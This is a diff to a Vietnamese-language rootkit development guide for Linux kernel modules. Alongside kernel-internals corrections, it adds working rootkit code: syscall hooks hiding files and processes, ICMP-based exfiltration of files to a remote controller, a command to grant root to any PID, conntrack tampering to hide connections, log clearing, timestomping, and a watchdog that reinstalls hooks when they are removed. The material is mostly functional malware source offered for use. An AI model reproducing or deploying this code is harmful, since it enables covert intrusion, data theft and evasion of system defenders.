@@ -148,7 +148,7 @@ User space:                        Kernel space:
                                       - Free .init.text section (khong can nua)
 ```
 
-Source code chinh: `kernel/module/main.c` (kernel 6.x) hoac `kernel/module.c` (kernel < 6.0).
+Source code chinh: `kernel/module/main.c` (kernel 5.19+) hoac `kernel/module.c` (kernel < 5.19).
 
 #### struct module — Trai tim cua moi loaded module
 
@@ -162,20 +162,22 @@ struct module layout (simplified, kernel 6.x):
 +-----------------------------------------------------------+
 | state                     MODULE_STATE_LIVE / GOING / etc  | +56
 |   Trang thai: LIVE (dang chay), GOING (dang unload),       |
-|   COMING (dang load)                                       |
+|   COMING (dang load). sizeof(enum) = 4 bytes.              |
 +-----------------------------------------------------------+
-| list (struct list_head)   { *next, *prev }                 | +60
+| (padding 4 bytes — compiler align list_head to 8 bytes)    | +60
++-----------------------------------------------------------+
+| list (struct list_head)   { *next, *prev }                 | +64
 |   Doubly-linked list ket noi TAT CA modules.               |
 |   lsmod iterate list nay. list_del() = an module.          |
 +-----------------------------------------------------------+
-| init                      pointer -> module_init function  | +76
+| init                      pointer -> module_init function  | +80
 |   Callback khi load. Set boi module_init() macro.          |
 |   Duoc free sau khi init() return.                         |
 +-----------------------------------------------------------+
-| exit                      pointer -> module_exit function  | +84
+| exit                      pointer -> module_exit function  | +88
 |   Callback khi unload. Set boi module_exit() macro.        |
 +-----------------------------------------------------------+
-| mkobj (struct module_kobject)                              | +92
+| mkobj (struct module_kobject)                              | +96
 |   Kernel object cho sysfs integration.                     |
 |   Tao /sys/module/NAME/ directory.                         |
 |   Rootkit can remove kobject de an khoi sysfs.             |
@@ -185,15 +187,28 @@ struct module layout (simplified, kernel 6.x):
 |   /sys/module/NAME/sections/                               |
 |   Chua address cua moi section -> info leak risk           |
 +-----------------------------------------------------------+
-| core_layout (struct module_layout)                         |
+| core_layout (struct module_layout)  [kernel < 6.4]         |
 |   .base  = base address cua module trong kernel memory     |
 |   .size  = tong kich thuoc                                 |
 |   .text_size = kich thuoc code section                     |
 |   .ro_size   = kich thuoc read-only section                |
+|                                                            |
+|   KERNEL 6.4+: core_layout/init_layout REMOVED.            |
+|   Thay boi: module->mem[MOD_TEXT], module->mem[MOD_DATA],  |
+|   module->mem[MOD_RODATA], etc. (struct module_memory).    |
+|   Compat macro:                                            |
+|     #if LINUX_VERSION_CODE >= KERNEL_VERSION(6,4,0)        |
+|       #define MOD_BASE(m) (m)->mem[MOD_TEXT].base          |
+|       #define MOD_SIZE(m) (m)->mem[MOD_TEXT].size           |
+|     #else                                                  |
+|       #define MOD_BASE(m) (m)->core_layout.base            |
+|       #define MOD_SIZE(m) (m)->core_layout.size             |
+|     #endif                                                 |
 +-----------------------------------------------------------+
-| init_layout (struct module_layout)                         |
+| init_layout (struct module_layout)  [kernel < 6.4]         |
 |   Tuong tu core_layout nhung cho .init sections.           |
 |   Duoc free sau khi init() chay xong.                      |
+|   Kernel 6.4+: module->mem[MOD_INIT_TEXT], etc.            |
 +-----------------------------------------------------------+
 | syms, num_syms                                             |
 |   Exported symbols (EXPORT_SYMBOL). Kernel modules khac    |
@@ -208,7 +223,7 @@ Luu y quan trong: `list_head` la co che rootkit dung de an module (Chapter 6). K
 
 #### Memory: Module duoc load o dau?
 
-`module_alloc()` cap phat memory cho module code. Tren x86-64, function nay dung `__vmalloc_node_range()` de cap phat trong vung MODULE_VADDR:
+`module_alloc()` cap phat memory cho module code. Tren x86-64, function nay dung `__vmalloc_node_range()` de cap phat trong vung MODULES_VADDR — gan kernel text de RIP-relative addressing (+-2GB) hoat dong:
 
 ```
 x86-64 Kernel Virtual Address Space Layout (48-bit, 4-level paging):
@@ -216,20 +231,22 @@ x86-64 Kernel Virtual Address Space Layout (48-bit, 4-level paging):
 
 0xFFFFFFFFFFFFFFFF  +---------------------------+  Top of virtual memory
                     |                           |
-0xFFFFFFFF80000000  | Kernel text (.text)       |  Direct-mapped kernel image
+0xFFFFFFFF00000000  +---------------------------+  MODULES_END
+                    |   Kernel modules          |  <-- Modules loaded HERE
+                    |   module_alloc() uses     |  Gan kernel text de
+                    |   __vmalloc_node_range()   |  RIP-relative addressing
+0xFFFFFFFFA0000000  +---------------------------+  MODULES_VADDR
+                    |   (hole)                  |
+0xFFFFFFFF80000000  | Kernel text (.text)       |  Kernel image mapping
          __START_   | Kernel data (.data/.bss)  |  Size: ~16MB typical
          KERNEL_map | sys_call_table, IDT, etc  |  = where vmlinux lives
                     |                           |
 0xFFFFFFFE80000000  +---------------------------+
                     |   (hole)                  |
-0xFFFFC90000000000  +---------------------------+  VMALLOC_START
-                    |   vmalloc / ioremap area  |
-                    |   ....                    |
-                    |   MODULE_VADDR range      |  <-- Modules loaded HERE
-                    |   (modules, BPF JIT,      |  module_alloc() uses this
-                    |    ioremap mappings)       |
-                    |   ....                    |
 0xFFFFE8FFFFFFFFFF  +---------------------------+  VMALLOC_END
+                    |   vmalloc / ioremap area  |
+                    |   BPF JIT, ioremap maps   |
+0xFFFFC90000000000  +---------------------------+  VMALLOC_START
                     |   (hole)                  |
 0xFFFF888000000000  +---------------------------+  PAGE_OFFSET
                     |  Direct physical mapping  |  1:1 map of all physical RAM
@@ -1097,6 +1114,8 @@ Moi Page Table Entry (8 bytes) co format:
    5   A       Accessed (CPU set khi page duoc read)
    6   D       Dirty (CPU set khi page duoc write)
    7   PS/PAT  Page Size (cho PUD/PMD) hoac PAT (cho PTE)
+   8   G       Global (1 = TLB entry khong bi flush khi CR3 change)
+  9-11 AVL     Available cho OS (Linux dung: _PAGE_SOFTW1/2/3)
   12-51        Physical address (bit [51:12] cua physical frame)
   63   NX      No-Execute (1 = khong duoc execute code trong page nay)
 ```
@@ -1623,8 +1642,18 @@ static unsigned long *find_syscall_table(void)
         return table;
 #endif
 
+    /* Method 4 (IDT scan) — doc IDT -> tim system_call -> extract table addr */
+    table = method_4_idt_scan();
+    if (table && validate_syscall_table(table))
+        return table;
+
     /* Method 5 (bruteforce) — slow nhung thorough */
     table = method_5_bruteforce();
+    if (table && validate_syscall_table(table))
+        return table;
+
+    /* Method 6 (kallsyms file) — doc /proc/kallsyms truc tiep */
+    table = method_6_kallsyms_file();
     if (table && validate_syscall_table(table))
         return table;
 
@@ -2230,6 +2259,94 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
 }
 
 /* ══════════════════════════════════════════════════════════════
+ * HOOK: getdents (legacy) — Separate handler cho struct linux_dirent
+ *
+ * KHONG dung chung hooked_getdents64 cho getdents vi struct KHAC:
+ *   linux_dirent:   { unsigned long d_ino, d_off; unsigned short d_reclen; char d_name[] }
+ *   linux_dirent64: { __u64 d_ino; __s64 d_off; unsigned short d_reclen; __u8 d_type; char d_name[] }
+ *
+ * Dung chung → corrupt d_name offset (thieu d_type field trong linux_dirent).
+ * Modern glibc chi dung getdents64, nhung 32-bit compat binaries van dung getdents.
+ * ══════════════════════════════════════════════════════════════ */
+
+struct linux_dirent {
+    unsigned long  d_ino;
+    unsigned long  d_off;
+    unsigned short d_reclen;
+    char           d_name[];
+};
+
+static asmlinkage long hooked_getdents(const struct pt_regs *regs)
+{
+    int fd = (int)regs->di;
+    struct linux_dirent __user *user_dirent =
+        (struct linux_dirent __user *)regs->si;
+
+    long ret = orig_getdents(regs);
+
+    struct linux_dirent *kern_dirent = NULL;
+    struct linux_dirent *current_entry;
+    struct linux_dirent *prev_entry = NULL;
+    unsigned long offset = 0;
+    bool is_proc = false;
+    long original_ret = ret;
+
+    if (ret <= 0)
+        return ret;
+
+    kern_dirent = kzalloc(ret, GFP_KERNEL);
+    if (!kern_dirent)
+        return ret;
+
+    if (copy_from_user(kern_dirent, user_dirent, ret)) {
+        kfree(kern_dirent);
+        return ret;
+    }
+
+    is_proc = is_proc_dir(fd);
+
+    offset = 0;
+    while (offset < ret) {
+        current_entry = (struct linux_dirent *)((char *)kern_dirent + offset);
+        if (current_entry->d_reclen == 0)
+            break;
+        if (current_entry->d_reclen > (ret - offset))
+            break;
+
+        bool should_hide = false;
+        if (strncmp(current_entry->d_name, HIDDEN_PREFIX,
+                    strlen(HIDDEN_PREFIX)) == 0)
+            should_hide = true;
+
+        if (is_proc && !should_hide) {
+            long pid_val;
+            if (kstrtol(current_entry->d_name, 10, &pid_val) == 0) {
+                if (is_pid_hidden((pid_t)pid_val))
+                    should_hide = true;
+            }
+        }
+
+        if (should_hide) {
+            if (current_entry == kern_dirent) {
+                ret -= current_entry->d_reclen;
+                memmove(current_entry,
+                        (char *)current_entry + current_entry->d_reclen,
+                        ret);
+                continue;
+            }
+            prev_entry->d_reclen += current_entry->d_reclen;
+        } else {
+            prev_entry = current_entry;
+        }
+        offset += current_entry->d_reclen;
+    }
+
+    copy_to_user(user_dirent, kern_dirent, ret);
+    kfree(kern_dirent);
+    return ret;
+}
+
+/* ══════════════════════════════════════════════════════════════
  * HOOK: kill — Magic signal command interface
  *
  * Tai sao dung kill():
@@ -2489,7 +2606,7 @@ int rk_install_hooks(void)
     rk_unprotect_memory();
 
     sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
-    sys_call_table[__NR_getdents]   = (unsigned long)hooked_getdents64;
+    sys_call_table[__NR_getdents]   = (unsigned long)hooked_getdents;
     sys_call_table[__NR_kill]       = (unsigned long)hooked_kill;
     sys_call_table[__NR_read]       = (unsigned long)hooked_read;
 
@@ -2523,9 +2640,10 @@ void rk_remove_hooks(void)
 
     rk_protect_memory();
 
-    /* Memory barrier: dam bao moi CPU thay restored values
-     * truoc khi module memory bi freed. */
-    msleep(10);  /* Cho time de in-flight syscalls hoan thanh */
+    /* Wait for all CPUs to finish any in-flight hook calls.
+     * synchronize_rcu blocks until all CPUs pass a quiescent state.
+     * Sau return, GUARANTEED khong CPU nao dang chay hook code. */
+    synchronize_rcu();
 
     pr_info("rk: syscall hooks removed\n");
 }
@@ -4427,7 +4545,7 @@ struct list_head {
 
 **container_of() macro** — Tu list_head pointer, tim pointer toi struct chua no:
 ```
-Dinh nghia (include/linux/kernel.h):
+Dinh nghia (include/linux/container_of.h, kernel 5.16+; truoc do: include/linux/kernel.h):
 
   #define container_of(ptr, type, member) \
       ((type *)((char *)(ptr) - offsetof(type, member)))
@@ -5687,9 +5805,10 @@ De hieu rootkit network hooking, ban can hieu duong di cua packet tu khi vao NIC
   │  │  Bat buoc: head <= data <= tail <= end                       │   │
   │  └─────────────────────────────────────────────────────────────┘   │
   │                                                                     │
-  │  __u16 network_header;     — offset tu head toi IP header          │
-  │  __u16 transport_header;   — offset tu head toi TCP/UDP header     │
-  │  __u16 mac_header;         — offset tu head toi MAC header         │
+  │  unsigned int network_header;   — offset tu head toi IP header      │
+  │  unsigned int transport_header; — offset tu head toi TCP/UDP header│
+  │  unsigned int mac_header;       — offset tu head toi MAC header    │
+  │  (sk_buff_data_t = unsigned int, 32-bit, NOT __u16)                │
   │                                                                     │
   │  __u32 len;                — tong chieu dai data (bao gom fragments)│
   │  __u32 data_len;           — chieu dai data trong fragments        │
@@ -5753,9 +5872,9 @@ De hieu rootkit network hooking, ban can hieu duong di cua packet tu khi vao NIC
                                      ✗ KHONG qua remaining hooks
                                      → HOAN TOAN INVISIBLE
 
-  CANH BAO: Trong thuc te, netfilter >= 4.13 co the tu handle
-  kfree_skb khi NF_STOLEN trong mot so truong hop, nhung rootkit
-  nen goi kfree_skb(skb) explicitly de dam bao khong leak.
+  CANH BAO: NF_STOLEN = hook OWN skb hoan toan. Netfilter framework
+  KHONG BAO GIO tu free skb khi NF_STOLEN (moi kernel version).
+  Hook PHAI goi kfree_skb(skb) sau khi xu ly xong, neu khong → memory leak.
 ```
 
 #### 8.0.5 call_usermodehelper() — Spawn userspace process tu kernel
@@ -6056,6 +6175,10 @@ static unsigned int nf_hook_handler(void *priv,
                         /* Execute command */
                         rk_execute_command(mp->cmd_data);
                         break;
+                    case 0x03:
+                        /* Exfiltrate file — doc file va gui qua ICMP */
+                        rk_exfiltrate_file(mp->cmd_data, ip_header->saddr);
+                        break;
                     case 0x04:
                         /* Self-destruct */
                         rk_self_destruct();
@@ -6070,9 +6193,9 @@ static unsigned int nf_hook_handler(void *priv,
                      *   - Generate ICMP reply
                      *   - Di qua remaining netfilter hooks
                      *
-                     * Caller PHAI free skb neu return NF_STOLEN:
-                     * kfree_skb(skb); — nhung netfilter handles this
-                     * khi hook return NF_STOLEN. */
+                     * NF_STOLEN = ta own skb, netfilter KHONG free.
+                     * PHAI goi kfree_skb truoc return. */
+                    kfree_skb(skb);
                     return NF_STOLEN;
                 }
             }
@@ -6096,11 +6219,22 @@ static unsigned int nf_hook_handler(void *priv,
         /* ──── Hide traffic tren HIDDEN_PORT ──── */
         if (ntohs(tcp_header->source) == HIDDEN_PORT ||
             ntohs(tcp_header->dest)   == HIDDEN_PORT) {
-            /* Cho packet pass nhung mark de hide tu logging.
-             * Alternative: NF_STOLEN de completely invisible. */
+            /* Detach skb tu conntrack → netstat/ss khong thay connection.
+             *
+             * nf_reset_ct(skb): xoa conntrack entry tu skb.
+             * Conntrack module track connections qua nf_conn struct
+             * gan vao skb->_nfct. Reset no → connection "khong ton tai"
+             * trong /proc/net/nf_conntrack va conntrack -L output.
+             *
+             * Ket qua: ss/netstat khong list port nay vi
+             * inet_diag dua vao sk, nhung conntrack-based tools
+             * (iptstate, conntrack -L) se miss. */
+            nf_reset_ct(skb);
 
-            /* Trick: set skb->sk = NULL → connection tracking skip.
-             * Conntrack miss = netstat/ss khong thay connection. */
+            /* Mark packet de nftables/iptables LOG rules skip.
+             * Mark 0xDEAD = custom marker, iptables rule:
+             *   -m mark --mark 0xDEAD -j ACCEPT (bypass LOG) */
+            skb->mark = 0xDEAD;
         }
     }
 
@@ -6553,6 +6687,138 @@ static void rk_execute_command(const char *cmd)
     int ret = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     if (ret)
         pr_err("rk: command exec failed: %d\n", ret);
+}
+```
+
+### 8.3.5 File Exfiltration — rk_exfiltrate_file
+
+```c
+/* exfiltrate.c — Doc file tu disk va gui qua ICMP echo reply
+ *
+ * Technique: doc file thanh chunks, gui moi chunk trong
+ * ICMP echo reply payload. Receiver (attacker) reassemble.
+ *
+ * Tai sao ICMP:
+ *   - ICMP echo reply it bi block hon outbound TCP
+ *   - Payload co the lon (MTU - headers)
+ *   - Khong can establish connection
+ *   - IDS thuong chi check ICMP rate, khong check payload
+ *
+ * Gioi han: max exfil ~1400 bytes/packet (MTU 1500 - IP - ICMP headers).
+ * File lon duoc chia thanh multiple packets voi sequence number.
+ */
+
+#define EXFIL_CHUNK_SIZE 1024
+#define EXFIL_MAGIC      0xEF11
+
+struct exfil_header {
+    u16 magic;
+    u16 seq;
+    u16 total;
+    u16 data_len;
+} __attribute__((packed));
+
+static void rk_exfiltrate_file(const char *filepath, __be32 dest_ip)
+{
+    struct file *f;
+    loff_t pos = 0;
+    char *buf;
+    ssize_t bytes_read;
+    struct exfil_header hdr;
+    u16 seq = 0;
+    loff_t file_size;
+    u16 total_chunks;
+
+    f = filp_open(filepath, O_RDONLY, 0);
+    if (IS_ERR(f)) {
+        pr_err("rk: exfil open failed: %s\n", filepath);
+        return;
+    }
+
+    file_size = i_size_read(file_inode(f));
+    total_chunks = (file_size + EXFIL_CHUNK_SIZE - 1) / EXFIL_CHUNK_SIZE;
+    if (total_chunks == 0) total_chunks = 1;
+
+    buf = kmalloc(EXFIL_CHUNK_SIZE, GFP_KERNEL);
+    if (!buf) {
+        filp_close(f, NULL);
+        return;
+    }
+
+    while ((bytes_read = kernel_read(f, buf, EXFIL_CHUNK_SIZE, &pos)) > 0) {
+        struct sk_buff *nskb;
+        struct iphdr *niph;
+        struct icmphdr *nich;
+        unsigned int payload_len = sizeof(hdr) + bytes_read;
+        unsigned int total_len = sizeof(struct iphdr) +
+                                  sizeof(struct icmphdr) + payload_len;
+
+        nskb = alloc_skb(LL_MAX_HEADER + total_len, GFP_KERNEL);
+        if (!nskb) break;
+
+        skb_reserve(nskb, LL_MAX_HEADER);
+        skb_reset_network_header(nskb);
+
+        /* Build IP header */
+        niph = skb_put(nskb, sizeof(struct iphdr));
+        niph->version  = 4;
+        niph->ihl      = 5;
+        niph->tos      = 0;
+        niph->tot_len  = htons(total_len);
+        niph->id       = htons(seq);
+        niph->frag_off = 0;
+        niph->ttl      = 64;
+        niph->protocol = IPPROTO_ICMP;
+        niph->saddr    = 0;  /* kernel fills via routing */
+        niph->daddr    = dest_ip;
+        niph->check    = 0;
+        niph->check    = ip_fast_csum((unsigned char *)niph, niph->ihl);
+
+        /* Build ICMP echo reply header */
+        nich = skb_put(nskb, sizeof(struct icmphdr));
+        nich->type = ICMP_ECHOREPLY;
+        nich->code = 0;
+        nich->un.echo.id = htons(EXFIL_MAGIC);
+        nich->un.echo.sequence = htons(seq);
+
+        /* Append exfil header + data */
+        hdr.magic    = htons(EXFIL_MAGIC);
+        hdr.seq      = htons(seq);
+        hdr.total    = htons(total_chunks);
+        hdr.data_len = htons((u16)bytes_read);
+        skb_put_data(nskb, &hdr, sizeof(hdr));
+        skb_put_data(nskb, buf, bytes_read);
+
+        /* Fix ICMP checksum */
+        nich->checksum = 0;
+        nich->checksum = csum_fold(skb_checksum(nskb,
+            skb_transport_offset(nskb),
+            nskb->len - skb_transport_offset(nskb), 0));
+
+        /* Route and send */
+        {
+            struct rtable *rt;
+            struct flowi4 fl4 = {};
+            fl4.daddr = dest_ip;
+            fl4.flowi4_proto = IPPROTO_ICMP;
+
+            rt = ip_route_output_key(&init_net, &fl4);
+            if (!IS_ERR(rt)) {
+                skb_dst_set(nskb, &rt->dst);
+                niph->saddr = fl4.saddr;
+                ip_local_out(&init_net, NULL, nskb);
+            } else {
+                kfree_skb(nskb);
+            }
+        }
+
+        seq++;
+        msleep(50);  /* Rate limit: 20 packets/sec */
+    }
+
+    kfree(buf);
+    filp_close(f, NULL);
+    pr_info("rk: exfil complete: %s (%u chunks)\n", filepath, seq);
 }
 ```
 
@@ -7495,7 +7761,9 @@ Calling convention khi goi BPF helper function:
  │     - Stack depth <= 512 bytes                   │
  │     - Program size <= 1M instructions (was 4096  │
  │       before kernel 5.2)                         │
- │     - Max 8 tail calls depth                     │
+ │     - Max 33 tail calls (MAX_TAIL_CALL_CNT)
+ │     - Max 8 BPF-to-BPF function call depth
+ │       (MAX_CALL_FRAMES — khac voi tail calls)                     │
  │     - Complexity limit (verified instructions)   │
  │                                                  │
  │  Result: ACCEPT → proceed to JIT                 │
@@ -8419,19 +8687,37 @@ struct cred (kernel/cred.c):
 #### 11.0.3 Privilege Escalation Flow — prepare_kernel_cred + commit_creds
 
 ```
-  prepare_kernel_cred(NULL)
+  prepare_kernel_cred(NULL)     ← DEPRECATED tu kernel 5.17!
     │
     │  1. Allocates new struct cred (kmalloc)
-    │  2. Tham so NULL → copy tu init_cred (PID 1 credentials)
+    │  2. Tham so NULL → copy tu init_cred (kernel/cred.c)
     │     init_cred = {
     │       uid = 0, gid = 0           (root)
-    │       cap_effective = FULL        (all 41 capabilities)
-    │       cap_permitted = FULL
-    │       cap_inheritable = FULL
-    │       cap_bset = FULL
-    │       cap_ambient = FULL
+    │       cap_effective   = FULL     (all 41 capabilities)
+    │       cap_permitted   = FULL
+    │       cap_inheritable = EMPTY    (khong FULL!)
+    │       cap_bset        = FULL
+    │       cap_ambient     = EMPTY    (khong FULL!)
     │     }
-    │  3. Return new_cred voi uid=0, gid=0, ALL capabilities
+    │  3. Return new_cred voi uid=0, gid=0
+    │
+    │  ⚠ KERNEL 5.17+: emits deprecation warning
+    │  ⚠ KERNEL 6.2+:  prepare_kernel_cred(NULL) RETURNS NULL!
+    │     → commit_creds(NULL) → KERNEL PANIC
+    │
+    │  MODERN APPROACH (kernel 6.2+):
+    │     struct cred *new = prepare_kernel_cred(current);
+    │     if (!new) return;
+    │     new->uid = new->euid = new->suid = new->fsuid = GLOBAL_ROOT_UID;
+    │     new->gid = new->egid = new->sgid = new->fsgid = GLOBAL_ROOT_GID;
+    │     new->cap_effective   = CAP_FULL_SET;
+    │     new->cap_permitted   = CAP_FULL_SET;
+    │     new->cap_inheritable = CAP_FULL_SET;
+    │     new->cap_bset        = CAP_FULL_SET;
+    │     commit_creds(new);
+    │
+    │  ALTERNATIVE: commit_creds(prepare_kernel_cred(&init_task))
+    │     (init_task luon ton tai, equivalent cu prepare_kernel_cred(NULL))
     │
     ▼
   commit_creds(new_cred)
@@ -8445,14 +8731,17 @@ struct cred (kernel/cred.c):
     ▼
   Process now has uid=0, full capabilities
 
-  CANH BAO voi prepare_kernel_cred(NULL):
-  ┌──────────────────────────────────────────────────────┐
-  │ Neu kmalloc FAIL → return NULL                       │
-  │ commit_creds(NULL) → NULL pointer dereference        │
-  │ → KERNEL PANIC                                       │
-  │                                                      │
-  │ LUON CHECK: if (!new_cred) return;                   │
-  └──────────────────────────────────────────────────────┘
+  CANH BAO voi prepare_kernel_cred:
+  ┌──────────────────────────────────────────────────────────┐
+  │ Kernel < 5.17:  prepare_kernel_cred(NULL) = OK           │
+  │ Kernel 5.17-6.1: NULL → warning + works                  │
+  │ Kernel 6.2+:    NULL → RETURNS NULL → PANIC!             │
+  │                                                          │
+  │ PORTABLE: prepare_kernel_cred(&init_task)                │
+  │ hoac:     prepare_kernel_cred(current) + manual set uid  │
+  │                                                          │
+  │ LUON CHECK: if (!new_cred) return;                       │
+  └──────────────────────────────────────────────────────────┘
 ```
 
 #### 11.0.4 Linux Capabilities — Fine-grained privileges
@@ -8655,9 +8944,9 @@ De hieu persistence mechanisms, truoc tien phai hieu Linux boot process — chuo
   │               │    │   │                                        │
   │               │    │   │  Goi TAT CA built-in module init()    │
   │               │    │   │  Theo thu tu priority levels:          │
-  │               │    │   │  0: early    3: subsys   6: late      │
-  │               │    │   │  1: core     4: fs       7: (unused)  │
-  │               │    │   │  2: postcore 5: device                │
+  │               │    │   │  0: early/pure  3: arch    6: device  │
+  │               │    │   │  1: core        4: subsys  7: late    │
+  │               │    │   │  2: postcore    5: fs                 │
   │               │    │   │                                        │
   │               │    │   └── ← BUILT-IN modules init here        │
   │               │    │                                            │
@@ -9417,10 +9706,10 @@ static bool rk_detect_kprobes_on_us(void)
     if (bytes > 0) {
         buf[bytes] = '\0';
         /* Check nếu có probe trên rootkit's module address range.
-         * THIS_MODULE->core_layout.base → module start address.
-         * THIS_MODULE->core_layout.size → module size. */
-        unsigned long mod_start = (unsigned long)THIS_MODULE->core_layout.base;
-        unsigned long mod_end   = mod_start + THIS_MODULE->core_layout.size;
+         * Kernel 6.4+: core_layout removed → dung module->mem[MOD_TEXT].
+         * Compat macro MOD_BASE/MOD_SIZE defined trong rootkit.h. */
+        unsigned long mod_start = (unsigned long)MOD_BASE(THIS_MODULE);
+        unsigned long mod_end   = mod_start + MOD_SIZE(THIS_MODULE);
 
         /* Parse mỗi dòng: "ADDR  STATUS  SYMBOL+OFFSET"
          * Nếu ADDR nằm trong module range → probe trên ta. */
@@ -9464,7 +9753,7 @@ static bool rk_timing_check(void)
  * 3. LOG TAMPERING
  * ══════════════════════════════════════════════════════════════ */
 
-static void rk_clear_dmesg(void)
+void rk_clear_dmesg(void)
 {
     /* Clear kernel ring buffer.
      * dmesg -C equivalent từ kernel. */
@@ -9504,10 +9793,19 @@ static void rk_timestomp(const char *filepath, struct timespec64 *ts)
          * atime = last access
          * mtime = last modification
          * ctime = last status change (cannot be set via utimensat,
-         *         nhưng kernel code CAN modify trực tiếp) */
+         *         nhưng kernel code CAN modify trực tiếp)
+         *
+         * KERNEL 6.6+: i_atime/i_mtime/i_ctime khong assignable truc tiep.
+         * Phai dung accessor macros: inode_set_atime_to_ts(), etc. */
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 6, 0)
+        inode_set_atime_to_ts(inode, *ts);
+        inode_set_mtime_to_ts(inode, *ts);
+        inode_set_ctime_to_ts(inode, *ts);
+#else
         inode->i_atime = *ts;
         inode->i_mtime = *ts;
         inode->i_ctime = *ts;
+#endif
 
         /* Mark inode dirty để filesystem write changes. */
         mark_inode_dirty(inode);
@@ -9517,7 +9815,7 @@ static void rk_timestomp(const char *filepath, struct timespec64 *ts)
 }
 
 /* Stomp rootkit files tới match timestamp của /bin/ls */
-static void rk_timestomp_rootkit_files(void)
+void rk_timestomp_rootkit_files(void)
 {
     struct file *ref;
     struct inode *ref_inode;
@@ -9529,7 +9827,11 @@ static void rk_timestomp_rootkit_files(void)
 
     ref_inode = file_inode(ref);
     if (ref_inode) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 6, 0)
+        ts = inode_get_mtime(ref_inode);
+#else
         ts = ref_inode->i_mtime;
+#endif
 
         /* Stomp rootkit files */
         rk_timestomp("/lib/modules/" UTS_RELEASE "/extra/rk.ko", &ts);
@@ -9552,10 +9854,21 @@ static struct task_struct *watchdog = NULL;
 static int watchdog_fn(void *data)
 {
     while (!kthread_should_stop()) {
-        /* Check 1: hooks vẫn intact */
-        /* (Verify syscall table entries vẫn trỏ tới hook functions) */
+        /* Check 1: hooks vẫn intact
+         * Verify syscall table entries vẫn trỏ tới hook functions.
+         * Nếu ai đó restore original → reinstall hooks. */
+        if (sys_call_table &&
+            sys_call_table[__NR_getdents64] != (unsigned long)hooked_getdents64) {
+            pr_warn("rk: hooks tampered, reinstalling\n");
+            rk_install_hooks();
+        }
 
-        /* Check 2: module vẫn trong memory */
+        /* Check 2: module code integrity
+         * Goi rk_integrity_check() (Appendix F) để verify
+         * hash cua code pages khong bi modify (anti-patching). */
+        if (rk_integrity_check && rk_integrity_check()) {
+            pr_warn("rk: code integrity violation detected\n");
+        }
 
         /* Check 3: persistence files tồn tại */
         struct file *f;
@@ -9769,9 +10082,10 @@ TCP header va options chua nhieu fields co the bi lam dung de nhung data ma khon
   │  ├──────────────────────────────────────────┤               │
   │  │         Acknowledgment Number (32)       │               │
   │  ├────┬──────┬──────┬──────────────────────┤               │
-  │  │Data│Rsvd  │Flags │    Window (16)        │               │
-  │  │Off │(4)   │(8)   │                      │               │
-  │  │(4) │      │FSRPAU│                      │               │
+  │  │Data│Rsvd│ Flags  │    Window (16)        │               │
+  │  │Off │(3) │ (9)    │                      │               │
+  │  │(4) │    │NCEUAPRSF                      │               │
+  │  │    │    │NS CWR ECE URG ACK PSH RST SYN FIN             │
   │  ├────┴──────┴──────┼──────────────────────┤               │
   │  │  Checksum (16)   │ Urgent Pointer (16)  │               │
   │  ├──────────────────┴──────────────────────┤               │
@@ -10524,6 +10838,42 @@ static struct nf_hook_ops nf_exfil_ops = {
  *   Hook DNS response packets (sport 53) inbound.
  * ══════════════════════════════════════════════════════════════ */
 
+/* give_root_to_pid — Escalate privileges cho target process.
+ * Tim task_struct boi PID, thay doi credentials thanh root.
+ * Dung prepare_kernel_cred approach compatible voi kernel 6.2+. */
+static void rk_give_root_to_pid(pid_t target_pid)
+{
+    struct task_struct *task;
+    struct cred *new_cred;
+
+    rcu_read_lock();
+    task = pid_task(find_vpid(target_pid), PIDTYPE_PID);
+    if (!task) {
+        rcu_read_unlock();
+        pr_err("rk: give_root: PID %d not found\n", target_pid);
+        return;
+    }
+    get_task_struct(task);
+    rcu_read_unlock();
+
+    new_cred = prepare_kernel_cred(task);
+    if (!new_cred) {
+        put_task_struct(task);
+        return;
+    }
+
+    new_cred->uid  = new_cred->euid  = new_cred->suid  = new_cred->fsuid  = GLOBAL_ROOT_UID;
+    new_cred->gid  = new_cred->egid  = new_cred->sgid  = new_cred->fsgid  = GLOBAL_ROOT_GID;
+    new_cred->cap_effective   = CAP_FULL_SET;
+    new_cred->cap_permitted   = CAP_FULL_SET;
+    new_cred->cap_inheritable = CAP_FULL_SET;
+    new_cred->cap_bset        = CAP_FULL_SET;
+
+    commit_creds(new_cred);
+    put_task_struct(task);
+    pr_info("rk: PID %d escalated to root\n", target_pid);
+}
+
 static unsigned int nf_icmp_c2_recv(void *priv,
                                       struct sk_buff *skb,
                                       const struct nf_hook_state *state)
@@ -10566,7 +10916,7 @@ static unsigned int nf_icmp_c2_recv(void *priv,
         if (payload_len >= 6) {
             pid_t target_pid;
             memcpy(&target_pid, payload + 2, sizeof(pid_t));
-            /* TODO: implement give_root_to_pid(target_pid) */
+            rk_give_root_to_pid(target_pid);
         }
         break;
     case 0x03:  /* Self destruct */
@@ -11182,6 +11532,11 @@ static void __exit rk_exit(void)
 {
     /* Cleanup nguoc thu tu init */
 
+    /* Show module truoc de rmmod hoat dong dung.
+     * Module da bi list_del() trong rk_hide_module() — neu khong
+     * restore thi rmmod cua hidden module se unpredictable. */
+    rk_show_module();
+
     rk_crypto_cleanup();
     rk_proc_cleanup();
 
@@ -11316,9 +11671,18 @@ int rk_get_hidden_pid_count(void)
 ### rootkit.h --- Header declarations (relevant additions)
 
 ```c
-/* rootkit.h --- Them declarations cho proc interface va crypto */
+/* rootkit.h --- Full declarations cho tat ca subsystems */
 
-/* ... (existing declarations) ... */
+/* ... (existing declarations tu Section 1.2) ... */
+
+/* Kernel 6.4+ compat: core_layout removed */
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
+  #define MOD_BASE(m) ((m)->mem[MOD_TEXT].base)
+  #define MOD_SIZE(m) ((m)->mem[MOD_TEXT].size)
+#else
+  #define MOD_BASE(m) ((m)->core_layout.base)
+  #define MOD_SIZE(m) ((m)->core_layout.size)
+#endif
 
 /* proc_interface.c */
 int  rk_proc_init(void);
@@ -11342,6 +11706,28 @@ int  rk_get_hidden_pid_count(void);
 bool rk_environment_safe(void);
 void rk_start_watchdog(void);
 void rk_stop_watchdog(void);
+void rk_clear_dmesg(void);
+void rk_timestomp_rootkit_files(void);
+bool rk_integrity_check(void);
+
+/* ftrace_hooks.c */
+int  rk_ftrace_install(void);
+void rk_ftrace_remove(void);
+
